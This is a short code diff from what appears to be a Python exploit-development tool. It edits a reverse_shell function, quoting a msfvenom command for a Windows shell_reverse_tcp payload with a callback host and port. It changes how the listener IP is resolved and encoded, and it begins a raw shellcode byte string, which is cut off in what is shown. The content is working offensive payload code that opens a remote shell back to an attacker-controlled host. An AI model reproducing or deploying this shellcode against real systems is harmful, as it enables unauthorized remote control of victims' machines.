@@ -36,13 +36,12 @@ def msgbox():
 
 
 def reverse_shell(lhost=None):
-    # msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.1.148 \
-    # LPORT=8080 -f python
-    # TODO pass IP
-    if lhost:
-        ip = utilities.ip_to_hex(lhost)
-    else:
-        ip = b"\xc0\xa8\x01\x94"  # 192.168.1.148
+    # msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp
+    # LHOST=192.168.1.148 LPORT=8080 -f python
+    if lhost is None:
+        lhost = utilities.get_ip()
+
+    ip = utilities.ip_to_hex(lhost)
 
     shellcode = bytes(b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
                       b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
